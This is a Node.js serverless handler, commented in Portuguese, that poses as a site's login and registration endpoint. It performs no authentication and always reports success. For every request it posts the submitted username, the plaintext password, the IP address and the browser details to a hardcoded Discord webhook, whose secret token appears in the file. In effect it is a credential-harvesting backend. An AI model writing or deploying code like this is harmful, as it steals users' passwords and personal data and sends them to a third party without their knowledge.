const https = require('https');

// Como o Vercel Serverless é stateless, o ideal para um sistema real seria usar um banco de dados (ex: MongoDB ou Redis).
// Como queremos algo que funcione "de uma vez por todas" de forma simples, vamos usar logs no Discord para você ter o controle
// e o localStorage no navegador do cliente para persistência rápida.
// No entanto, para permitir login de outros PCs, os dados precisam estar em algum lugar.

const WEBHOOK_LOGINS = "https://discord.com/api/webhooks/1484176339207454911/VBl5RHQhvsDEBI-51tplBAnzXjouHcw0osr_-P1aaJL1LTtGQJMiA3uOjp8AK2a-cRqO";

async function sendToDiscord(embed) {
  const payload = JSON.stringify({ embeds: [embed] });
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  return new Promise((resolve) => {
    const req = https.request(WEBHOOK_LOGINS, options, (res) => {
      res.on('data', () => {});
      res.on('end', () => resolve());
    });
    req.on('error', (e) => {
      console.error(`Erro Discord:`, e.message);
      resolve();
    });
    req.write(payload);
    req.end();
  });
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, username, password, ip, userAgent } = req.body;

  if (type === 'register') {
    // Log de Cadastro
    await sendToDiscord({
      title: "🆕 NOVO CADASTRO REALIZADO",
      color: 0x10b981, // Verde
      fields: [
        { name: "👤 Usuário", value: `\`${username}\``, inline: true },
        { name: "🔑 Senha", value: `\`${password}\``, inline: true },
        { name: "📍 IP", value: ip || "Desconhecido" },
        { name: "🌐 Navegador", value: userAgent || "Desconhecido" }
      ],
      timestamp: new Date()
    });
    return res.status(200).json({ success: true, message: "Cadastro registrado com sucesso!" });
  }

  if (type === 'login') {
    // Log de Tentativa de Login
    await sendToDiscord({
      title: "🔐 LOGIN REALIZADO NO SITE",
      color: 0x7c3aed, // Roxo
      fields: [
        { name: "👤 Usuário", value: `\`${username}\``, inline: true },
        { name: "🔑 Senha", value: `\`${password}\``, inline: true },
        { name: "📍 IP", value: ip || "Desconhecido" }
      ],
      timestamp: new Date()
    });
    return res.status(200).json({ success: true, message: "Login realizado!" });
  }

  return res.status(400).json({ error: "Tipo de requisição inválido" });
};
